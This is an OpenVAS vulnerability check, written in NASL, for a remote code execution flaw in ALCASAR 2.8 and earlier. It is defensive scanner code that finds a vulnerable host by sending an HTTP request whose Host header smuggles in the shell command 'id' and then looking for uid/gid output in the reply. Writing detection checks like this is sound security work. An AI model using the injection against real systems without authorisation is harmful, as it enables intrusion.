###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_alcasar_rce_09_14.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# ALCASAR Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105082");
  script_version("$Revision: 11867 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("ALCASAR Remote Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Sep/26");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Sep/46");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary commands");
  script_tag(name:"vuldetect", value:"Send a specially crafted value in the 'host' HTTP header and check the response.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"ALCASARis prone to a remote code execution vulnerability.");
  script_tag(name:"affected", value:"ALCASAR <= 2.8");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-09-08 11:48:21 +0200 (Mon, 08 Sep 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/alcasar", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );

  if( "<title>ALCASAR" >!< buf ) continue;

  host = http_host_name( port:port );
  req = 'GET ' + dir + '/index.php HTTP/1.1\r\n' +
        'Host: ' + host + 'mailto:openvas@example.org;id;#' +
        'Connection: close\r\n' +
        '\r\n\r\n';
  result = http_keepalive_send_recv( port:port, data:req );

  if( result =~ "uid=[0-9]+.*gid=[0-9]+" ) {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );
